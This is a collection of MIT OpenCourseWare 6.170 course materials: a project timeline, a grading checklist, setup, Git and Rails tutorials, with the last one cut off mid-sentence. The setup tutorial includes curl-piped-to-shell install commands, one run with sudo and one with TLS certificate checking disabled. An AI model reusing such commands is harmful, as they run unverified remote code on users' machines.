      "content": "Time\nTitle\nContent\nWhere\nPortion of grade\nP4.0\nWeek 10, in class\nTeam pitch\nHighlights of design: purpose, goals\nand context; key concepts; key\nfeatures; design challenges.\nHighlights of teamwork plan: risks\nidentified and planned mitigations.\nIn class at 1:00pm;\nPDF in advance\nemail to staff by 9am\n5%\nTeamwork contract\nIn repo\n2%\nP4.1\nWeek 10, end of week\nInitial design\nDesign: all parts except evaluation In repo\n20%\nTeamwork plan (including\nidentification of minimum viable\nproduct)\nIn repo\n3%\nP4.2\nWeek 11, end of week\nMVP implementation\nProgramming: basic code only\nIn repo\n10%\nWeek 12, in class\nMVP demo\nDemonstration\nIn class at 1:00pm;\nURL of deployed\napp in advance email\nto staff by 9am\n5%\nP4.3\nWeek 12, end of week\nFinal design\nUpdated design document, with\nchanges identified\nIn repo\n5%\nWeek 13, in class\nProject fair\nFinal demonstration\nIn class at 1:00pm;\nURL of deployed\napp in advance email\nto staff by 9am\n5%\nP4.4\nWeek 13, end of week\nFinal delivery\nAll previous parts, updated with\nchanges identified\nIn repo\nProgramming: all parts\nIn repo\n25%\nDesign: evaluation\nIn repo\n5%\nTeamwork: reflection\nIn repo\n5%\nWeekly\nBy arrangement with mentors\nWeekly mentoring meetings\nAgenda, report and minutes\nLocation by\narrangement;\nmaterials in repo\n10%\nFirst meeting during Week 10\nLast meeting during Week 13\ntotal\n100%\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Project Checklist",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/a5bcd8f98c3b4e39117002331fee576b_MIT6_170S13_proj-chklst.pdf",
      "content": "Area\nSubdivision\nItem\nCriteria\nProgramming\nBasic coding\nCode\nConsistent naming and layout\nJudicious use of comments, especially for failure paths\nReasonable function and module length\nNo duplicated code\nIdiomatic use of language, including avoidance of bad parts\nAppropriate and skillful use of advanced language features\nAppropriate use of known algorithms and data structures\nAppropriate use of libraries\nCitations for borrowed code and ideas\nModularity\nCode\nCode sensibly divided into modules and files\nNamespace, structured and coherent\nSeparation of concerns (especially presentation/content)\nClean and simple module interfaces\nData types immutable when possible\nAbstract data types used when appropriate\nAbstraction barriers not violated\nInter-module dependences controlled\nDesign decisions localized as much as possible\nSpecifications\nSuccinct but informative specifications for public interfaces\nPreconditions given, especially on session state\nVerification\nRuntime assertions\nRuntime assertions to check non-trivial expectations\nRepresentation invariants for abstract types\nSchema invariants declared, maintained (& checked if appropriate)\nUnit tests of public interfaces\nRepeatable suite of tests for key methods of service interfaces\nSecurity\nCode\nAppropriate use of security mitigations (eg, sanitization)\nAccess control mechanisms implemented, as relevant\nSafe defaults used\nDesign\nOverview\nPurpose and goals\nBrief description of system to be built\nKey goals and purpose\nMotivation for development (eg, deficiencies of existing solutions)\nContext diagram\nEstablishes boundary of system\nInteractions between system and external entities\nConcepts\nKey concepts\nBrief explanation of key enabling concepts\nObject model\nObject model describing main state components\nImplementation details excluded\nSmall details that don't impact behavior omitted or abstracted\nSyntactically valid diagram with consistent naming & layout\nGeneralization used appropriately\nNames of sets and relations well chosen\nDefinitions in accompanying text of non-obvious elements\nBehavior\nFeature descriptions\nSuccinct but precise descriptions of each feature\nSecurity concerns\nSummary of key security requirements and how addressed\nHow standard attacks are mitigated\nThreat model: assumptions about attackers\nUser interface\nWireframes for application\nFlow between pages indicated, with named actions\nErrors accounted for\nChallenges\nDesign challenges\nList of problems to resolve in concepts, behaviors or implementation\nFor each problem: options available, evaluation, which chosen\nNote on code design: schema design choices, abstractions\nEvaluation\nCritique\nSummary assessment from user's perspective\nSummary assessment from developer's perspective\nMost and least successful decisions\nPriorities for improvement\nReflection\nMost and least successful aspects of project\nWhat I learned from it and can improve on next time\nTeam Work\nPlan\nStakeholders\nList of stakeholders and their roles\nResources\nList of computational, cost and time constraints\nTasks\nList of tasks, expected effort, allocation to team members\nCalendar of intermediate and final milestones for tasks\nRisks\nEnumeration of expected risks and their mitigations\nMinimum viable product\nIdentification of minimum viable product for first release\nSubset of features to be included\nIssues postponed (eg, security mitigations, user interface elements)\nProvides real value to users\nProvides opportunity for feedback\nOn path to full product\nTeam contract\nTeam contract\nExpected level of achievement and effort for each team member\nPersonal goals for each team member\nFrequency, length and location of team meetings\nHow quality of work will be maintained\nHow tasks will be assigned, and what to do if deadlines are missed\nHow decisions will be made and disagreements resolved\nMeetings\nAgenda\nOne agenda for each meeting\nAgenda prepared in advance of meeting\nProgress report\nOne report for each meeting, prepared in advance\nSummarizes progress since previous meeting\nIdentifies achieved and missed milestones\nIdentifies difficulties encountered\nIdentifies changes found in problem or constraints\nMeeting minutes\nSummary of discussions and advice from mentor\nSummary of new decisions\nChanges to plan or milestones\nReflection\nPeer review\nConstructive but candid evaluations of team mate performance\nEvaluation\nEvaluation of project from team planning perspective\nLessons learned\nSummary of key lessons learned\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 0: Development Environment Setup and First App",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/b58bfbc30c9ff12e806f9e1742cc3e77_MIT6_170S13_rec0DevEnvSet.pdf",
      "content": "6.170 Tutorial 0 Development Environment Setup and First App\nWarning: Installation can be quite time consuming as each system/laptop has a slightly different\nenvironment and you may have to install some software in addition to those listed below. Get\nstarted with this soon and contact the TAs if you have questions.\nPrerequisites\n1.\nA laptop (or a desktop) with Windows 7, MAC OS, or Linux (Ubuntu 12.04) installed.\nGoals of this Tutorial\n1.\nInstall Ruby on Rails on your computer.\n2.\nInstall Git on your computer.\n3.\nSignup for GitHub account. (http://www.github.com)\n4.\nSignup for a Heroku account. (http://www.heroku.com)\n5.\nCreate a \"Hello World\" app using Ruby on Rails and deploy it to Heroku\nStep 1: For Windows Users Only Install Ruby and Rails\nRuby Installation\nInstall the latest version of Ruby (1.9.3) by downloading the installer at\nhttp://cdn.rubyinstaller.org/archives/1.9.3-p327/rubyinstaller-1.9.3-p327.exe\nThis is the official Ruby installer for Windows system. After downloading, doubleclick\non it and follow the wizard. Using the default options will be fine. After the install, add the bin\ndirectory to your path environment variable(Default options => add \"C:\\Ruby193\\bin\" to system\nPath variable).\nRails Installation\nOpen the command prompt window and install rails by executing the command: \"gem install\nrails\". This installs Rails and the dependent gems. (\"Gems\" are ruby packages/libraries)\nStep 1: For MAC OSX Users Only Install Ruby and Rails\nMake sure XCode is installed, we will need the gcc compiler and it comes with a plethora of\ncommand line tools. Expect to run into a lot of issues, set aside substantial time to install\nRuby/Rails. Contact TAs with your questions.\nThe Long\nFollow instructions at:\nhttp://ruby.railstutorial.org/ruby-on-rails-tutorial-book#sec-rubygems\n\nThe Short\nInstall XCode (app store) → XCode → Preferences → Downloads → Command Line Tools\n$ sudo \\curl -L https://get.rvm.io | bash -s stable --ruby\n$ rvm get head && rvm reload\nMake sure you have gcc-4.2 with `which gcc-4.2`\n$ rvm install 1.9.3\nDownload RubyGems (http://rubyforge.org/frs/?group_id=126)\n$ ruby setup.rb\n$ gem update --system 1.8.24\n$ gem install rails -v 3.2.11\nNote: If you encounter the error \"There has been an error while running make. Halting the\ninstallation,\" install HomeBrew using:\n$ ruby -e \"$(curl -fskL raw.github.com/mxcl/homebrew/go)\"\nStep 1: For Linux (Ubuntu 12.04) Users Only Install Ruby and Rails\nFollow instructions at:\nhttp://blog.sudobits.com/2012/05/02/how-to-install-ruby-on-rails-in-ubuntu-12-04-lts/\nStep 2: Testing Rails Installation\nTest rails is installed: open a command window and go to the directory you want your projects\nand run the following command:\n$ rails new helloworld\nThis command will create a new directory named \"helloworld\" and bunch of directories like\n\"app\", \"config\" \"db\", \"doc\", \"lib\", \"log\" etc under it. You will become very familiar with these\ndirectories and their contents over the course of the semester.\nStart the web server by running the following commands in a terminal window:\n$ cd helloworld\n$ rails server\nYou should see an output line like: \"WEBrick::HTTPServer#start: pid=3433 port=3000\" which\nconfirms that the web server is started. Now open your web browser and go to\n\"http://127.0.0.1:3000/\". If you see the \"Welcome aboard\" page, Ruby on Rails is successfully\ninstalled on your computer!\n\nStep 3: Install and Setup Git, GitHub\nInstall Git\nFor Windows Users\nDownload the installer from http://code.google.com/p/msysgit and run it\nFor MAC and Linux Users\nCheck if you already have Git installed by running the command:\n$ which git\nIf you do not have Git, install it using:\n$ sudo apt-get install git\nCreate a GitHub Repository\nCreate a GitHub repository named \"projectzero\".\nImportant: The GitHub repository name must be \"projectzero\" for the instructions in this tutorial\nto work successfully.\nMore details on Git and GitHub are covered in recitation #1\nClone the GitHub Repository\ngit clone <url_of_your_github_repository>\nMore details on Git and GitHub are covered in recitation #1\nStep 4: Create Your Rails App for \"Project P0\"\nNow we will create a new rails app called \"projectzero\", add the required code, push it to GitHub\nand to heroku. Before running the commands shown below, make sure that you have:\n1.\nCreated a GitHub repository for this assignment\n2.\nCloned it to a local directory (referred as <cloned_repository> below)\nThe details of cloning a GitHub repository will be covered in recitation #1.\nIn a command window, run the following commands:\n$ cd <parent_of_projectzero>\nWarning: If you are not in the parent directory of \"projectzero\" before executing the instructions\nshown below, you will very likely end up with a directory structure which Heroku does not\nunderstand. This will result in a \"pre-receive hook failure\" error when pushing your app to Heroku.\n$ rails new projectzero\nNote: Details of Git, GitHub, and repository creation will be covered later in the recitation for\nWeek #1. Please have Git installed on your laptops and a be signed up on GitHub in preparation.\n\nNote: You might be asked for permission to overwrite the .gitignore file. You can say NO to this\nrequest.\n$ cd projectzero\n$ git add .\n$ git commit -m s\"Created app for Project Zero\"\n$ git push origin\nIn a new command window, start the app as follows:\n$ rails server\nGo to http://localhost:3000/ in your web browser and you should see the generic page for a new\nrails app.\nIn the first command window, execute the following:\n$ rails generate controller hello sayhi\nThis will generate the necessary controller and view files. The\n\"projectzero/app/controller/hello_controller.rb\" file should look like:\nclass HelloController < ApplicationController\ndef sayhi\nend\nend\nEdit \"projectzero/app/views/hello/sayhi.html.erb\" file so that it looks like:\n<h1>Hello World!</h1>\nIn \"projectzero/config/routes.rb\", find line beginning with \"# root :to =>\".\nReplace that line with:\nroot :to => \"hello#sayhi\"\nDelete \"projectzero/public/index.html\", which is the default Welcome to Ruby on\nRails page. Otherwise this will override our routing.\nNow when you access http://localhost:3000, you should see a new welcome page which says\n\"Hello World!\"\nStep 5: Setup Heroku\nSignup for a Heroku account at http://www.heroku.com Install required packages by running the\n\nfollowing commands in a command window:\nFor mac and linux users:\n$ sudo gem install heroku foreman\nFor windows users:\nC:\\> gem install heroku foreman\nA few more configuration steps to work with heroku:\n$ ssh-keygen -t rsa\n$ heroku keys:add\nThe above commands create RSA keys to authenticate you whenever you use the heroku\ncommand line and to establish a secure communication channel between your computer and\nheroku servers. You can find more details at: https://devcenter.heroku.com/articles/keys\nTo create your first app on heroku, run the following command:\n$ heroku create\nYou will see output similar to:\n$ Creating afternoon-waters-7298... done, stack is cedar\n$ http://afternoon-waters-7298.herokuapp.com/\n$ git@heroku.com:afternoon-waters-7298.git\nYou can now view your app at a URL like http://afternoon-waters-7298.herokuapp.com/.\nImportant: Remember to include this URL of your app in the \"projectzero/README.md\" file\nbefore you turn in your project.\nWhen heroku created the app for you, it also created a remote git repository to which you can\npush your code. Make your local git aware of this remote repository by running the commands:\n$ cd projectzero\n$ git remote add projectzero git@heroku.com:afternoon-waters-7298.git\nNote: Replace \"afternoon-waters-7298\" in the command with the name of your heroku app\nStep 6: Deploy your Project Zero app to Heroku\nMake the following changes to \"projectzero/Gemfile\"\nDelete the line \"gem 'sqlite3'\" from this file.\nAdd the following section at the end of the file:\ngroup :development, :test do\ngem 'sqlite3'\n\nend\ngroup :production do\ngem 'pg'\nend\nThe reason for doing this change is that \"sqlite3\" is the default development database used by\nrails. However, it is a very lightweight database with limited features and is not suitable for real\nworld applications. So Heroku expects you to use a more powerful database system (like\npostgres). The above lines instruct rails to use sqlite3 database in development environment and\nto use postgres in production environment. If you don't make this change to the Gemfile, your\ndeployment to heroku in the next step will fail.\nInstall all required gems mentioned in this Gemfile:\n$ cd projectzero\n$ bundle install\nLets check the status of the local Git repository before pushing it to heroku:\n$ git status\nThis will list your modified files as well as new files which are in your directory but not in Git\nrepository. Add required files to the repository using:\n$ git add <path_to_file>\nNow commit your changes to the repository using:\n$ git commit -am \"Added 'Hello World' code\"\nTo deploy the app to heroku, run the following commands:\n$ cd projectzero\n$ git push projectzero master\nThis will push your code to the git repository on heroku deploy it. Once successfully deployed,\nyou can now open a web browser and view your app at your app URL like\nhttp://afternoon-waters-7298.herokuapp.com/\nStep 7: Push your app to GitHub\nOnce you have your app working locally and also on heroku, you are almost ready to push it to\nGitHub. In a command window, run the following commands:\n$ cd projectzero\n$ git push origin master\nThis command will ask you for your GitHub username and password and then upload your code\nto the github repository.\n\nStep 8: Submit a \"Pull Request\" on GitHub\nNote: This part will be covered in recitation #1.\nOnce you successfully push your code to GitHub, you must submit a \"pull request\" via GitHub.\nThis will inform your TAs that your project code is uploaded to Github.\nAdditional Notes:\n1.\nAn excellent tutorial for installing RoR on Mac is available at:\nhttp://www.moncefbelyamani.com/how-to-install-xcode-homebrew-git-rvm-ruby-on-mac/\n2.\nFor Windows,\na.\nDownload and install the DevKit from: http://rubyinstaller.org/downloads\nb.\nFollow the instructions at:\nhttp://github.com/oneclick/rubyinstaller/wiki/Development-kit\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 1: Git",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/9395cd5506f95fee592ddadfa920b0ee_MIT6_170S13_rec1-Git.pdf",
      "content": "6.170 Tutorial 1 Git\nPrerequisites\n1.\nHave Git installed and configured. (See: https://help.GitHub.com/articles/set-up-git)\n2.\nSignup for a GitHub account. (http://www.github.com)\nGoals of this Tutorial\n1.\nGet familiar with source code version control using Git\n2.\nCreate your first Git repository\n3.\nLearn useful Git commands to be used throughout the course\n4.\nCreate a GitHub repository and learn to push/pull code from this repository\nToday's Tutorial\n1. What is Git?\n1.\nA version control system for project code allows \"snapshot\" like functionality so that you\ncan view and compare previous versions of your files.\n2.\nAllows easy collaboration for source code development between team members.\n3.\n\"The purpose of Git is to manage a project, or a set of files, as they change over time. Git\nstores this information in a data structure called a repository.\" [1]\n2. How Git works\n2.1 Core concept: Repository\nA Repository consists of :\n1.\nA set of commit objects identified by a SHA1 name. Think of a commit as a snapshot in\ntime of your project code. You can create as many commits as you want.\n2.\nA set of references to commit objects. These references are called \"heads\". (Not to be\nconfused with HEAD (capitalized) which is a reference to the current head)\nA commit object consists of:\n1.\nA set of files, reflecting the state of a project at a given point in time.\n2.\nReferences to parent commit objects.\n3.\nAn SHA1 name, a 40character string that uniquely identifies the commit object. The\nname is composed of a hash of relevant aspects of the commit, so identical commits will\nalways have the same name.\n4.\nExample of a commit (obtained using \"git log\"):\n$ commit 034072dc2c02da0ab2872c0315a3f237027eb5e7\n$ Author: Your Name <your.name@mit.edu>\n$ Date: Sat Nov 10 17:08:57 2012 -0500\n$ 1. Better Logging. 2. Schema changes\n\n2.2 Simple Operations on Repositories\n1.\nTo create a repository, use \"git init\"\na.\n$ mkdir <project_dir>\nb.\n$ cd <project_dir>\nc.\n$ git init\nd.\nThis will create a \".git\" directory in <project_dir>\ne.\nNote: This is your local repository and not necessarily shared with others. See\nimage below for operations on local and remote repositories. Remote repositories\nare explained later in this tutorial.\n2.\nTo add files to the repository, use \"git add <file_or_dir>\" followed by \"git\ncommit\"\na.\n$ cd <project_dir>\nb.\n$ echo 'Hello World' > hello1.txt\nc.\n$ echo 'Hello MIT' > hello2.txt\nd.\n$ echo 'Hello 6.170' > hello3.txt\ne.\n$ git add hello1.txt hello2.txt\nf.\nThis tells Git to include both files \"hello1.txt\" and \"hello2.txt\" in the next commit to\nthe repository.\ng.\n\"git add .\" works recursively and includes all files and subdirectories. Note: Use\nthis recursive command cautiously.\nh.\nTo include individual files, use \"git add /path/to/file/<filename>\"\ni.\nWildcard could be used. \"git add '*.txt'\" will add all files with suffix txt. Note: need\nto use single quotes.\nj.\n$ git commit -a -m \"Adding test files to the repository \"\nk.\nThis will create a commit object consisting the two files and add them to the\n\nrepository along with the message specified by the \"-m\" flag.\nl.\nNote: \"git add <file_or_directory>\" must be repeated before each\n\"git commit\" operation.\n3.\nTo check history of commits in your repository, use \"git log\"\n4.\nTo delete files from the repository, use \"git rm\"\na.\n$ git rm hello1.txt\nb.\nThis will remove hello1.txt from your repository as well as your local copy of\nhello1.txt\n5.\nLets do a few more operations locally:\na.\n$ cd <project_dir>\nb.\n$ echo 'Hello World! git rocks!' >> hello2.txt\nc.\n$ rm hello3.txt\n6.\nTo check the current status of your project, use \"git status\"\na.\n$ cd <project_dir>\nb.\n$ git status\nc.\nThis will show all modified files, new files, and deleted files.\n7.\nComparing two versions of a file\na.\n$ git diff hello2.txt\nb.\nThis will show you the differences between your local version and the repository\nversion of the file.\nc.\nTo see differences between two previous commits, use \"git diff\n<commit1> <commit2> [<path>]\"\n8.\nUnstaging a file (Removing a file from a commit)\nBefore you push, if you decide that you do not want a file to be included in a commit, you\ncould unstage the file, using \"git reset HEAD [<path>]\".\n9.\nCheckout a particular version of the file\nTo discard local changes, you could use \"git checkout [<path>]\", which gives you\na latest version of the file from the repository. If you would like a particular version of the\nfile. You could do \"git checkout abcde [<path>]\" where 'abcde' is the hash of the\ncommit that you want.\n10. Revert commit\nTo revert a particular commit, you could use \"git revert\". One example usage is \"git\nrevert HEAD~3\", which revert the changes specified by the fourth last commit in\nHEAD and create a new commit with the reverted changes.\n11. Asking for help\na.\n$ git help or $ git help <command>\n12. Configure Git using \"git config <option>\" or via \".gitconfig\",\n\".gitignore\" files\nSample usage:\n$ git config --global user.name \"Your Name\"\n$ git config --global alias.co checkout\n\na.\nMy ~/.gitconfig file is shown below:\n[user]\nname = First Last\nemail = first.last@mit.edu\n[alias]\nco = checkout\n[core]\nexcludesfile = /home/user1/.gitignore\nb.\nMy ~/.gitignore file is shown below:\n# Ignore swp and tmp files.\n*.swp\n*~\n*#\n.#*\n*.log.*\nc.\nSee \"git help config\" for more details\nd.\nNote: Strongly recommend that you have a \".gitignore\" file to prevent log files and\nother temporary files from being added to your repository. GitHub can also create\na \".gitignore\" file for you when you are creating a new repository.\n2.3 Branching and Merging\n1.\nBranches allow parallel development from a commit point, without affecting the parent\nbranch. Branches will be useful when working on your class projects.\n2.\nNote: \"The terms \"branch\" and \"head\" are nearly synonymous in Git. Every branch is\nrepresented by one head, and every head represents one branch. Sometimes, \"branch\"\nwill be used to refer to a head and the entire history of ancestor commits preceding that\nhead, whereas \"head\" will be used to refer exclusively to a single commit object, the\nmost recent commit in the branch.\" [1]\n3.\nTo list current branches in your repository, use \"git branch\"\na.\n$ git branch\nb.\nThis will list all branches in your repository with the current active branch shown\nwith a star against its name\nc.\nWhen a new repository is created, a default branch master is also created.\n4.\nTo create a new branch from a specific commit point, use \"git branch <head>\n<commit>\"\na.\n$ git branch assignment2\nbb7d8622387cd70a31c198f6f84133fc2303ec85\nb.\nThis will create a branch named \"assignment2\" from the commit specified in the\nthe hash value.\nc.\n$ git branch assignment3 HEAD^\n\nd.\nThis will create a branch named \"assignment3\" from the parent of HEAD. (HEAD^\nis a reference to the parent node of the node to which HEAD refers)\n5.\nTo switch to a new branch, use \"git checkout <new_branch>\"\na.\n$ git checkout assignment1\nb.\nThis will make HEAD point to \"assignment1\"\nc.\nWarning:: If there are any uncommitted changes when you run \"git checkout\", Git\nwill behave very strangely. The strangeness is predictable and sometimes useful,\nbut it is best to avoid it. All you need to do, of course, is commit all the new\nchanges before checking out the new head\".[1]\n6.\nMerge a branch using \"git merge <head>\" or \"git pull <head>\"\na.\nNote: \"git pull <head>\" is preferred.\nb.\n$ git checkout master\nc.\nNow HEAD points to master\nd.\n$ git pull assignment1\ne.\nThis will merge changes from branch \"assignment1\" into \"master\"\nf.\nWarning: Git can get very confused if there are uncommitted changes in the files\nwhen you ask it to perform a merge. So make sure to commit whatever changes\nyou have made so far before you merge. [1]\n7.\nDelete a branch using \"git branch -d <head>\"\n.3 Team collaboration using GitHub\n1.\nSo far, we have been working on a local repository only.\n2.\nUnlike other version control systems, Git does not have a client-server model. It is a\npeer-to-peer model and every developer has their own independent repository.\n3.\nGit allows communication between repositories via \"ssh\", \"http\", or fs paths (if the other\nrepository is on the same file system).\n4.\nUsing this communication feature, teams can have a \"central\" repository to share work\nwithin the team members. Each team member works on their own local repository.\nWhen satisfied with the work, s/he \"pushes\" code to the central repository. Other\ndevelopers can then \"pull\" the code from this repository and get the latest changes. We\nwill use GitHub as this central repository.\n5.\nLogin to GitHub and creating a new repository named \"hello6170\". Be sure to choose the\noption of \"Create a Readme file\". This will allow you to clone the repository to your local\nrepository immediately.\n6.\nClone the remote repository using \"git clone <path_to_repository>\"\na.\n$ mkdir <new_repo>\nb.\n$ cd <new_repo>\nc.\n$ git clone\nhttps://github.com/<your_username>/hello6170.git\nd.\nThis will create a local version of the files in your remote repository into the\ncurrent directory, along with a \".git\" sub-directory - the local repository.\ne.\nThe \".git/config\" file has the following sections:\ni.\n[remote \"origin\"]\n\nii.\nfetch = +refs/heads/*:refs/remotes/origin/*\niii. url = https://github.com/<username>/hello6170.git\niv. [branch \"master\"]\nv.\nremote = origin\nvi. merge = refs/heads/master\nvii. These two sections help Git to \"push\" and \"pull\" code between the\n\"master\" branch on your local repository and the remote repository -\n\"origin\" - as shown below.\nf.\nCreate a new file and add it to the local repository\ni.\n$ cd <new_repo>\nii.\n$ echo 'Hello World' > helloworld.txt\niii. $ git add helloworld.txt\niv. $ git commit -a -m \"First commit\"\nv.\nYou just created a new file and added it to your local repository.\nvi. $ git status\nvii. $ # On branch master\nviii. $ # Your branch is ahead of 'origin/master' by 1\ncommit.\nix. Git knows that you are one commit ahead of the remote repository!\na.\nTo push your new files from the local repository to the remote repository\ni.\n$ git push origin master\nii.\n$ Username for 'https://github.com':\n<github_username>\niii. $ Password for 'https://<uname>@github.com': <pwd>\niv. $ git status\nv.\n$ # On branch master\nvi. $ nothing to commit (working directory clean)\nvii. Now your remote repository and local repository are identical.\nviii. Note: Only those files which are commited will be pushed to the remote\nrepository. If you have files which are added to the repository but not\ncommited, they will not be pushed. It is strongly recommended that you\ncommit all your changes before pushing code/files to the remote\nrepository.\nb.\nTo pull the latest code and files from the remote repo into your local repo\ni.\n$ git pull origin\nii.\n$ Already up-to-date.\niii. If there were files which were new or updated by others, they will be\ncopied to your local repository.\niv. Repeat Warning: Git can get very confused if there are uncommitted\nchanges in the files when you ask it to perform a merge. So make sure to\ncommit whatever changes you have made so far before you merge. [1]\n\nNext Tutorial\nRuby on Rails Basics\nReferences\n1.\nhttp://www.sbf5.com/~cduan/technical/git/git-1.shtml\n2.\nhttps://help.github.com/articles/set-up-git\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 2: Rails Basics",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/9b49a7257c007519d7b8475f1b3da140_MIT6_170S13_rec2-RailsBas.pdf",
      "content": "6.170 Tutorial 2 Rails Basics\nPrerequisites\n1.\nRoR Installed and \"Hello World\" app from P0 working.\n2.\nFamiliarity with \"Separation of Concerns\" and MVC Controller.\n3.\nSome knowledge of databases is useful but not necessary.\nGoals of this Tutorial\nGet familiar with the some basics of development using Ruby on Rails.\nTutorial\nNote: Read the README.rdoc file of your app. It has some very useful information for\ndeveloping and debugging Rails apps. You'll also find a lot of useful guides from\nhttp://guides.rubyonrails.org/index.html.\nYou Must Have Already Figured:\n1.\nWhat is Ruby on Rails?\na.\nA framework for rapid webbased development using the Ruby language\nb.\nA community of passionate developers and contributors.\n2.\nWhat features does it provide?\na.\nClean Separation of concerns: ModelViewController.\nb.\nRapid webbased software development and testing.\nc.\nRapid DB Access and Migrations without knowing many details of databases.\nd.\nrake, a \"make\" system for Ruby for automating repetitive tasks.\ne.\nExcellent software testing tools details will be covered in a future recitation.\nf.\nA vibrant community of developers and contributors who make life easy for you.\n3.\nWhat is Heroku? What features does it provide?\na.\nA cool hosting service for RoR apps makes deploying and running complete\nRoR applications very easy.\nb.\nIs based on Amazon EC2 infrastructure; allows dynamic provisioning of web\nservers, and backend servers.\n4.\nWhat is Git? GitHub?\na.\nGit is an awesome source control system and GitHub is an online service for\neasy creation and sharing of Git repositories.\nTopic #0: Useful commands when developing rails applications\n\"rails\" command provides many useful scripts for auto code generation etc. Examples:\n$ rails [command] [args]\n$ rails new <project>\n$ rails generate <asset | model | resource etc.> <parameters>\n\n$ rails destroy <asset | model | resource etc.> <parameters>\n\"rake\" is Ruby's make system. Many useful development tasks come included as rake tasks\nExamples:\n$ rake -T\n$ rake db:setup; rake db:migrate; rake db:drop:all\n$ rake test; rake test:uncommitted\nNote: Many common tasks come built-in with rails but you can always develop custom rake\ntasks to automate your own work.\nTopic #1: Routing in Rails\nThe material in this section is adapted from: http://guides.rubyonrails.org/routing.html\nAlso see documentation in your routes.rb file\nRails Router\n1.\nMaps a URI to methods in controllers\na.\nExample: post \"home/login\" => \"home#login\"\n2.\nUtility methods for generating paths and URLs - no hard-coding of URLs\n3.\nRouting specified in config/routes.rb config file\nTwo kinds of Routing in Rails\n1.\nResourceful Routing: Shorthand for resources\n2.\nNon-Resourceful Routing: For all other routing\nResourceful Routing Examples\nAt the command line in your app directory:\n$ rails generate resource book title:string author:string\nprice:number\nCheck config/routes.rb file for:\nresources :books\nThis creates seven different routes in your application, all mapping to the Books controller:\nHTTP Verb\nPath\naction\nused for\nGET\n/books\nindex\ndisplay a list of all\nbooks\nGET\n/books/new\nnew\nreturn an HTML form\nfor creating a new\nbooks\n\nPOST\n/books\ncreate\ncreate a new book\nGET\n/books/:id\nshow\ndisplay a specific\nbook\nGET\n/books/:id/edit\nedit\nreturn an HTML form\nfor editing a book\nPUT\n/books/:id\nupdate\nupdate a specific\nbook\nDELETE\n/books/:id\ndestroy\ndelete a specific book\nIn your browser, go to http://localhost:3000/books/new You will see an error like :\nUnknown action\nThe action 'new' could not be found for BooksController\nNow edit the app/controllers/book_controller.rb file so that it looks like:\nclass BooksController < ApplicationController\ndef index\nrender \"index\", :layout => false\nend\ndef new\n@time_now = Time.now\n## render \"new\", :layout => false\nend\nend\nAdd file app/views/books/index.html.erb so that it looks like:\n<html>\n<head>\n</head>\n<body>\n<h1> Show a listing of all books here </h1>\n\n<%= \"This is dynamically generated content at: #{Time.now}\" %>\n</body>\n</html>\nAdd file app/views/books/new.html.erb so that it looks like:\n<html>\n<head>\n</head>\n<body>\n<h1> Show form for creating a new book here </h1>\n<%= \"This is dynamically generated content at: #{@time_now}\" %>\n</body>\n</html>\nNow http://localhost:3000/books and http://localhost:3000/books/new will work. Similarly, other\naction methods like show update, edit destroy can be defined on Books controller and\ncorresponding view files written.\nNotice in this example:\n1.\n:render directive and its parameters\n2.\nRendering of appropriate view even when :render is not specified in \"new\" method\n3.\nDynamic content in view files and variable scope + visibility between controllers and\nviews\nExamples of NonResourceful Routing\n## Static routes\npost /home/login => \"home#login\"\npost /library/catalog/update => \"library/catalog#update\"\nget /home/index\n## Examples of routes with dynamic segments\nmatch \":controller/\" => \":controller#index\"\nhttp://localhost:3000/books will map to BooksController.index\nmatch \":controller/:action\"\nhttp://localhost:3000/books/deleteall will map to BooksController.deleteall\nWarning: This route will match every method in every controller. Use cautiously.\nmatch \":controller/:action/:user_id\"\nhttp://localhost:3000/books/checkout/10 will map to BooksController.checkout with\nparams[:user_id] = 10\n\nNote: You can mix static and dynamic segments in the match directive.\nHelper Methods for Routing in Controllers and Views\nresource_path, resource_url. For resource :books\n●\nbooks_path returns /books\n●\nnew_book_path returns /books/new\n●\nedit_book_path(:id) returns /books/:id/edit (for instance, edit_book_path(10) returns\n/books/10/edit)\n●\nbook_path(:id) returns /books/:id (for instance, book_path(10) returns /books/10)\nEach of these helpers has a corresponding _url helper (such as books_url) which returns the\nsame path prefixed with the current host, port and path prefix.\nInspecting and Testing Routes\n$ rake routes\nMore Routing Concepts\nNamespaces in Resourceful Routing\nYou can define namespaces for each of your resources as shown below:\nnamespace :admin do\nresources :posts, :comments\nend\nNested Resources\nSee http://guides.rubyonrails.org/routing.html#nested-resources\nURL Redirection Using Routes\nSee http://guides.rubyonrails.org/routing.html\nRoute Globbing\nmatch 'books/*other' => 'books#unknown'\nThis route would match \"books/12\" or \"/books/long/path/to/12\", setting params[:other] to \"12\" or\n\"long/path/to/12\".\nTopic #2: Views and Client Side Assets\nAlso see: http://guides.rubyonrails.org/layouts_and_rendering.html\nWe will use \"erb\" format for dynamic views. You are welcome to use and experiment with other\n\nview technologies like HAML and choose the one which suits you best. But not all TAs may not\nbe able to help you if you encounter problems - only one of the TAs uses HAML regularly.\nView Basics\nDynamic content specified in erb files via \"<% %>\" delimiters\n<% [some_ruby_code] %>\n<%= [some_ruby_code_which_will_be_printed] %>\nNote: Only Instance scoped variables from controller available to views\nExamples:\nStore the current time in \"now\":\n<% now = Time.now %>\nOutput the current time:\n<%= Time.now %>\nPrint a HTML table of all books\n<table>\n<% @books.each.do |book| %>\n<tr>\n<td><%= book.title%></td>\n<td><%= book.author%></td>\n<td><%= 